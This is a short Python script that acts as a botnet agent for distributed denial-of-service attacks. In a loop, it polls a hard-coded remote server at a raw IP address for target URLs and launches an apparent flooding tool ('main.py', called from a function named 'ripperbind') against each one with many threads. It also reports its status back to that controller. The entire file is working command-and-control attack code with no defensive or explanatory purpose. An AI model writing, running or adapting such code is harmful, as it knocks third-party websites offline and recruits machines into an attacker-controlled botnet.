import subprocess
import threading
import requests
import argparse
import time
subprocess_obj = None
last_website = None
active_bot = None
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--thread", default="135",help="Thread")
args = parser.parse_args()

if(args.thread):
    thread_count = int(args.thread)
else:
    thread_count = 135

def ripperbind(ip,thread):
    global subprocess_obj
    subprocess_obj = subprocess.Popen(["python", "main.py", "--url", str(ip), "--threads", str(thread)])


while(True):
    resp = requests.get("http://157.245.98.223:5000/getcommand")
    content = resp.text
    if(content.find("target")>-1):
        content = content.replace("target=","")
        url = content
        if(url!=last_website):
            try:
                subprocess_obj.terminate()
                thread.join()
            except:
                pass
            thread = threading.Thread(target=ripperbind,args=(url, thread_count))
            thread.start()
            last_website = url
            requests.get(f"http://157.245.98.223:5000/aktif?sayi={thread_count}")
        time.sleep(10)

